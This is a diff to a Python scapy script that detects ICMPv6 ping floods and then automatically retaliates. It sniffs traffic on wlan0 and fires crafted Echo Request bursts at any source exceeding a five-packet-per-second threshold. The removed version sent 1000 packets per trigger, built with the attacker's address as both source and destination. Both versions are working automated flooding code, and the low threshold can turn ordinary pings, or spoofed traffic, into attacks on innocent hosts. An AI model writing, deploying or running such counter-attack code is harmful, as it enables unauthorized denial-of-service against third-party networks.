@@ -8,7 +8,7 @@ import random
 from scapy.all import *
 
 # Constants
-FLOOD_THRESHOLD = 10  # Number of packets per second to consider as flooding
+FLOOD_THRESHOLD = 5  # Number of packets per second to consider as flooding
 COUNTER_ATTACK_DURATION = 30  # Duration of counter-attack in seconds
 PACKET_SIZE = 64  # Size of ICMPv6 packets
 
@@ -40,63 +40,58 @@ class PingFloodCounter:
         return ipv6/icmpv6
 
     def monitor_traffic(self):
-        """Monitor network traffic for ICMPv6 Echo Requests"""
-        try:
-            # Create raw socket for capturing packets
-            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-            s.bind(('eth0', 0))  # Replace 'eth0' with your network interface
+        def handle_pkt(pkt):
+            if pkt.haslayer(ICMPv6EchoRequest):
+                src_ip = pkt[IPv6].src
+                current_time = time.time()
 
-            while self.running:
-                packet = s.recvfrom(65535)[0]
-                
-                # Parse Ethernet header
-                eth_header = struct.unpack('!6s6sH', packet[:14])
-                eth_type = eth_header[2]
+                with self.lock:
+                    if src_ip not in self.attackers:
+                        self.attackers[src_ip] = {'count': 1, 'first_seen': current_time}
+                    else:
+                        self.attackers[src_ip]['count'] += 1
 
-                if eth_type == 0x86dd:  # IPv6
-                    # Parse IPv6 header
-                    ipv6_header = struct.unpack('!BBHHBB16s16s', packet[14:54])
-                    next_header = ipv6_header[0] & 0xFF
+                        time_diff = current_time - self.attackers[src_ip]['first_seen']
+                        if time_diff >= 1.0:
+                            rate = self.attackers[src_ip]['count'] / time_diff
+                            print(f"[DEBUG] {src_ip} -> Rate: {rate:.2f} packets/sec")
+                            if rate >= FLOOD_THRESHOLD:
+                                print(f"Flood attack detected from {src_ip}! Rate: {rate:.2f} packets/sec")
+                                print(f"[DEBUG] Flood detected from {src_ip}. Executing counter-attack...")
+                                self.counter_attack(src_ip)
+                                self.attackers[src_ip] = {'count': 0, 'first_seen': current_time}
+                            self.attackers[src_ip] = {'count': 0, 'first_seen': current_time}
 
-                    if next_header == 58:  # ICMPv6
-                        # Parse ICMPv6 header
-                        icmpv6_header = struct.unpack('!BBHHH', packet[54:64])
-                        icmpv6_type = icmpv6_header[0]
-
-                        if icmpv6_type == 128:  # Echo Request
-                            src_ip = ipaddress.IPv6Address(packet[22:38])
-                            current_time = time.time()
-
-                            with self.lock:
-                                if src_ip not in self.attackers:
-                                    self.attackers[src_ip] = {'count': 1, 'first_seen': current_time}
-                                else:
-                                    self.attackers[src_ip]['count'] += 1
-                                    
-                                    # Check if this is a flood attack
-                                    time_diff = current_time - self.attackers[src_ip]['first_seen']
-                                    if time_diff >= 1.0:  # Check rate over 1 second
-                                        rate = self.attackers[src_ip]['count'] / time_diff
-                                        if rate >= FLOOD_THRESHOLD:
-                                            print(f"Flood attack detected from {src_ip}! Rate: {rate:.2f} packets/sec")
-                                            self.counter_attack(src_ip)
-                                            self.attackers[src_ip] = {'count': 0, 'first_seen': current_time}
-
-        except Exception as e:
-            print(f"Error in monitor_traffic: {e}")
+        print("[*] Sniffing ICMPv6 Echo Requests on wlan0...")
+        sniff(iface="wlan0", filter="icmp6 and ip6", prn=handle_pkt, store=0)
 
     def counter_attack(self, attacker_ip):
-        """Launch counter-attack against the attacker"""
         print(f"Launching counter-attack against {attacker_ip}")
-        
-        # Get local IPv6 address
+        print(f"[DEBUG] Flood detected from {attacker_ip}. Executing counter-attack...")
+
+        if attacker_ip.startswith("fe80::"):
+            attacker_ip += "%wlan0"
+
         local_ip = self.get_local_ipv6()
-        
-        # Create and send spoofed packets
-        for _ in range(1000):  # Send 1000 packets in the counter-attack
-            packet = self.create_icmpv6_packet(attacker_ip, attacker_ip)
-            send(packet, verbose=0)
-            time.sleep(0.001)  # Small delay to avoid overwhelming the network
+        print(f"Using source IP: {local_ip}")
+
+        # Get MAC address of interface
+        iface = "wlan0"
+        try:
+            attacker_mac = getmacbyip6(attacker_ip)
+            src_mac = get_if_hwaddr(iface)
+        except Exception as e:
+            print(f"Failed to resolve MAC: {e}")
+            return
+
+        for _ in range(100):
+            ipv6 = IPv6(src=local_ip, dst=attacker_ip)
+            icmp = ICMPv6EchoRequest(id=random.randint(0, 65535), seq=random.randint(0, 65535))
+            pkt = Ether(src=src_mac, dst=attacker_mac) / ipv6 / icmp
+            sendp(pkt, iface=iface, verbose=0)
+            time.sleep(0.001)
+
+
 
     def get_local_ipv6(self):
         """Get local IPv6 address"""
